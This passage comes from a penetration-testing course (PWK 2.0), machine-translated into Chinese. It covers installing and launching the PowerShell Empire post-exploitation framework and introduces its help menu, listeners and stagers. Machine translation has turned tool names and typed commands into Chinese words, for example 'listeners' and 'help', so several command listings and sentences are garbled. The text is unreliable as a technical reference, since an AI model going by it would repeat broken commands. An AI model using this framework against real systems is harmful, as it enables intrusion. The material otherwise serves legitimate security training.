<div style="position:absolute;top:126407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块需要 Python 2.6 或 2.7。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:126469;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从历史上看，PowerShell Empire 专注于 Windows 开发，而</font></font></i></nobr></div>
<div style="position:absolute;top:126488;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单独的项目，称为 EmPyre，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">720</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标是 Mac OS X/macOS 和 Linux。</font><font style="vertical-align: inherit;">在</font></font></i></nobr></div>
<div style="position:absolute;top:126507;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell Empire 的第二个主要版本，这些项目被合并，</font></font></i></nobr></div>
<div style="position:absolute;top:126527;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保持原来的名称，通常简称为帝国。</font><font style="vertical-align: inherit;">这</font></font></i></nobr></div>
<div style="position:absolute;top:126546;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell Empire 项目不再受到原始开发人员的支持，但</font></font></i></nobr></div>
<div style="position:absolute;top:126565;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经创建了更新的分叉，例如 BC-SECURITY。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第721章</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分叉版</font></font></i></nobr></div>
<div style="position:absolute;top:126585;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最近发布了一个 3.0 版本。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">722</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Empire 似乎与 Metasploit 框架共享许多功能，但它们却大不相同</font></font></nobr></div>
<div style="position:absolute;top:126666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在自然界。</font><font style="vertical-align: inherit;">Metasploit 包含大量旨在获得初始访问权限的漏洞。</font><font style="vertical-align: inherit;">帝国，</font></font></nobr></div>
<div style="position:absolute;top:126685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一方面，被设计为主要针对 Active Directory 的后开发工具</font></font></nobr></div>
<div style="position:absolute;top:126705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font><font style="vertical-align: inherit;">它倾向于利用目标操作系统的内置功能及其主要功能</font></font></nobr></div>
<div style="position:absolute;top:126724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:126762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1 安装、设置和使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要在 Kali Linux 上安装 Empire，我们将使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">git</font></font></b><font style="vertical-align: inherit;">从公共 GitHub 存储库克隆项目</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:126823;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">clone </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后运行</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">install.sh</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /opt</font></font></font></b></nobr></div>
<div style="position:absolute;top:126891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/opt$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo git clone https://github.com/PowerShellEmpire/Empire.git</font></font></font></b></nobr></div>
<div style="position:absolute;top:126908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克隆到“帝国”...</font></font></nobr></div>
<div style="position:absolute;top:126925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程：枚举对象：12216，完成。</font></font></nobr></div>
<div style="position:absolute;top:126942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程：总计 12216（增量 0），重用 0（增量 0），包重用 12216</font></font></nobr></div>
<div style="position:absolute;top:126959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接收对象：100% (12216/12216)，21.96 MiB | </font><font style="vertical-align: inherit;">3.22 MiB/s，完成。</font></font></nobr></div>
<div style="position:absolute;top:126976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析增量：100% (8312/8312)，完成。</font></font></nobr></div>
<div style="position:absolute;top:127010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/opt$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd Empire/</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:127103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">719 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国计划，2019），https://github.com/EmpireProject/Empire</font></font></font></nobr></div>
<div style="position:absolute;top:127123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">720 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Will Schroeder, 2016), https://www.harmj0y.net/blog/empyre/building-an-empyre-with-python/</font></font></font></nobr></div>
<div style="position:absolute;top:127143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">721 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（BC 安全，2019 年），https://github.com/BC-SECURITY/Empire</font></font></font></nobr></div>
<div style="position:absolute;top:127163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">722 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（BC 安全，2019 年），https://github.com/BC-SECURITY/Empire/tree/dev</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:127291;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="108"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 108 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:127324;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:128401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:128401;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:128401;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">725</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/opt/Empire$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ./setup/install.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:127436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:127456;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 819 - 在 Kali Linux 上安装 PowerShell Empire</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire 允许跨多个服务器的渗透测试人员之间使用共享进行协作</font></font></nobr></div>
<div style="position:absolute;top:127504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私钥和扩展，共享密码。</font><font style="vertical-align: inherit;">但是，我们安装的是单个实例，所以</font></font></nobr></div>
<div style="position:absolute;top:127524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font><font style="vertical-align: inherit;">在密码提示下</font><font style="vertical-align: inherit;">按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以生成随机密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:127576;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 输入服务器协商密码，输入随机生成：</font></font></nobr></div>
<div style="position:absolute;top:127595;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 820 - 生成一个随机的服务器协商密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在安装了框架，我们可以用恰当地命名的Python脚本，启动帝国</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帝国</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/opt/Empire$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ./empire</font></font></font></b></nobr></div>
<div style="position:absolute;top:127677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:127693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==============</font></font></nobr></div>
<div style="position:absolute;top:127710;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[Empire] 后开发框架</font></font></nobr></div>
<div style="position:absolute;top:127727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==============</font></font></nobr></div>
<div style="position:absolute;top:127744;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">【版本】2.5 | </font><font style="vertical-align: inherit;">[网站] https://github.com/empireProject/Empire</font></font></nobr></div>
<div style="position:absolute;top:127761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==============</font></font></nobr></div>
<div style="position:absolute;top:127795;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_______ .___ ___。</font><font style="vertical-align: inherit;">.______ __ .______ _______</font></font></nobr></div>
<div style="position:absolute;top:127812;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">____|| </font><font style="vertical-align: inherit;">\/ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">_ \ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">_ \ | </font><font style="vertical-align: inherit;">____|</font></font></nobr></div>
<div style="position:absolute;top:127829;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|__ | </font><font style="vertical-align: inherit;">\ / | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|_) | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|_) | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|__</font></font></nobr></div>
<div style="position:absolute;top:127846;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">__| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|\/| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">___/ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/ | </font><font style="vertical-align: inherit;">__|</font></font></nobr></div>
<div style="position:absolute;top:127863;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|____ | </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">|\ \----.| </font><font style="vertical-align: inherit;">|____</font></font></nobr></div>
<div style="position:absolute;top:127880;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_______|||__| </font><font style="vertical-align: inherit;">|__| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">_| </font><font style="vertical-align: inherit;">|__| </font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">_| </font><font style="vertical-align: inherit;">`._____||_______|</font></font></nobr></div>
<div style="position:absolute;top:127931;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前加载 285 个模块</font></font></nobr></div>
<div style="position:absolute;top:127965;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 听众当前处于活动状态</font></font></nobr></div>
<div style="position:absolute;top:127999;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 个代理当前处于活动状态</font></font></nobr></div>
<div style="position:absolute;top:128050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(帝国) &gt;</font></font></nobr></div>
<div style="position:absolute;top:128069;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 821 - 启动 PowerShell Empire</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:128100;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:128100;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell Empire 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">help</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出 Empire 中可用的各种命令，包括 listeners、stagers、</font></font></nobr></div>
<div style="position:absolute;top:128157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理和模块。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助</font></font></font></b></nobr></div>
<div style="position:absolute;top:128226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></nobr></div>
<div style="position:absolute;top:128243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:128260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理商    </font></font></nobr></div>
<div style="position:absolute;top:128260;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳转到代理菜单。</font></font></nobr></div>
<div style="position:absolute;top:128277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信用    </font></font></nobr></div>
<div style="position:absolute;top:128277;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向/从数据库添加/显示凭据。</font></font></nobr></div>
<div style="position:absolute;top:128294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口    </font></font></nobr></div>
<div style="position:absolute;top:128294;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出帝国</font></font></nobr></div>
<div style="position:absolute;top:128311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助    </font></font></nobr></div>
<div style="position:absolute;top:128311;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示帮助菜单。</font></font></nobr></div>
<div style="position:absolute;top:128328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相互作用    </font></font></nobr></div>
<div style="position:absolute;top:128328;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与特定代理交互。</font></font></nobr></div>
<div style="position:absolute;top:128345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表    </font></font></nobr></div>
<div style="position:absolute;top:128345;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出活动代理或侦听器。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:128479;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="109"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 109 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:128512;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:129589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:129589;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:129589;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">726</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:128608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众    </font></font></nobr></div>
<div style="position:absolute;top:128608;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与活跃的听众互动。</font></font></nobr></div>
<div style="position:absolute;top:128624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载    </font></font></nobr></div>
<div style="position:absolute;top:128624;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从非标准文件夹加载 Empire 模块。</font></font></nobr></div>
<div style="position:absolute;top:128641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入    </font></font></nobr></div>
<div style="position:absolute;top:128641;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载插件文件以扩展 Empire。</font></font></nobr></div>
<div style="position:absolute;top:128658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件    </font></font></nobr></div>
<div style="position:absolute;top:128658;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有可用和活动的插件。</font></font></nobr></div>
<div style="position:absolute;top:128676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">preobfuscate Preobfuscate PowerShell module_source 文件</font></font></nobr></div>
<div style="position:absolute;top:128692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新加载    </font></font></nobr></div>
<div style="position:absolute;top:128692;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新加载一个（或所有）Empire 模块。</font></font></nobr></div>
<div style="position:absolute;top:128709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告    </font></font></nobr></div>
<div style="position:absolute;top:128709;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成报告 CSV 和日志文件：session.csv、credentials.csv、mas</font></font></nobr></div>
<div style="position:absolute;top:128726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重启    </font></font></nobr></div>
<div style="position:absolute;top:128726;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重置全局选项（例如 IP 白名单）。</font></font></nobr></div>
<div style="position:absolute;top:128743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源    </font></font></nobr></div>
<div style="position:absolute;top:128743;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件中读取并执行 Empire 命令列表。</font></font></nobr></div>
<div style="position:absolute;top:128760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchmodule Search Empire 模块名称/描述。</font></font></nobr></div>
<div style="position:absolute;top:128777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放    </font></font></nobr></div>
<div style="position:absolute;top:128777;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置全局选项（例如 IP 白名单）。</font></font></nobr></div>
<div style="position:absolute;top:128794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表演    </font></font></nobr></div>
<div style="position:absolute;top:128794;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示全局选项（例如 IP 白名单）。</font></font></nobr></div>
<div style="position:absolute;top:128811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用模块    </font></font></nobr></div>
<div style="position:absolute;top:128811;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Empire 模块。</font></font></nobr></div>
<div style="position:absolute;top:128828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用者    </font></font></nobr></div>
<div style="position:absolute;top:128828;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用帝国舞台。</font></font></nobr></div>
<div style="position:absolute;top:128847;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 822 - help 命令中的 Empire 选项</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:128878;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:128878;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众和舞台表演者</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:128916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将以听众和舞台表演者的简短讨论开始我们的帝国之旅。</font><font style="vertical-align: inherit;">相当于</font></font></nobr></div>
<div style="position:absolute;top:128936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 的 multi/handler，监听器接受来自不同 Empire 代理的入站连接。</font></font></nobr></div>
<div style="position:absolute;top:128969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Stagers 是由 Empire 生成的一小段代码，它们在受害者身上执行并连接</font></font></nobr></div>
<div style="position:absolute;top:128988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到听众。</font><font style="vertical-align: inherit;">他们在受害者和攻击者之间建立连接并执行</font></font></nobr></div>
<div style="position:absolute;top:129007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加任务以促进分阶段有效载荷的转移。</font></font></nobr></div>
<div style="position:absolute;top:129040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要开始 Empire 会话，我们将首先进入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">listeners</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上下文，然后打印可用的 listeners</font></font></nobr></div>
<div style="position:absolute;top:129060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uselistener</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟一个</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和一个双</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来完成 Empire 的 Tab</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">补全</font></font></b></font></nobr></div>
<div style="position:absolute;top:129079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特征。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(帝国) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众</font></font></font></b></nobr></div>
<div style="position:absolute;top:129131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[!] 当前没有活跃的听众 </font></font></nobr></div>
<div style="position:absolute;top:129165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uselistener</font></font></font></b></nobr></div>
<div style="position:absolute;top:129182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库    </font></font></nobr></div>
<div style="position:absolute;top:129182;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http_com http_hop meterpreter   </font></font></nobr></div>
<div style="position:absolute;top:129199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http    </font></font></nobr></div>
<div style="position:absolute;top:129199;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http_foreign http_mapi 重定向器    </font></font></nobr></div>
<div style="position:absolute;top:129218;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 823 - 列出侦听器类型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听器是最基本的监听器和类似的窗口/ Meterpreter就会/ reverse_http有效载荷</font></font></nobr></div>
<div style="position:absolute;top:129267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Metasploit 中，通过一系列 HTTP GET 和 POST 请求进行通信来模拟</font></font></nobr></div>
<div style="position:absolute;top:129286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">合法的 HTTP 流量。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:129348;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向器侦听器也值得一提，因为它创建了一个支持</font></font></i></nobr></div>
<div style="position:absolute;top:129368;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过受感染的主机与内部网络进行通信。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
